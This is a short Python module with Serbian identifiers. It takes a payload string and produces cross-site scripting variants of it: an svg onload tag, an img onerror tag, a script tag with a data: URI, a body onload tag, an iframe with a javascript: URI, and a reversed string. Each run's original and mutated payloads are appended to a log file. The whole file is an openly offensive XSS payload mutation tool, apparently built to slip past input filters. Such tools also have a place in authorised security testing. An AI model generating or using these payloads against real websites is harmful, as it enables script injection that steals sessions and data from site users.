import random
from datetime import datetime

STIL_VARIJACIJE = [
    lambda p: f"<svg/onload={p.strip('<>')}>",
    lambda p: f"<img src='x' onerror='{p}'>",
    lambda p: f"<script src='data:text/javascript,{p}'></script>",
    lambda p: f"<body onload={p}>",
    lambda p: f"<iframe src='javascript:{p}'></iframe>",
    lambda p: p[::-1],
]

def generisi_stilizovane(payload: str):
    stilizovani = [f for f in {transform(payload) for transform in STIL_VARIJACIJE}]
    timestamp = datetime.now().isoformat(sep=' ', timespec='seconds')
    log_entry = f"\n--- {timestamp} ---\nOriginal: {payload}"
    for s in stilizovani:
        log_entry += f"\nStilizovano: {s}"
    with open("mutacije.log", "a") as f:
        f.write(log_entry + "\n")
        f.flush()
    return stilizovani
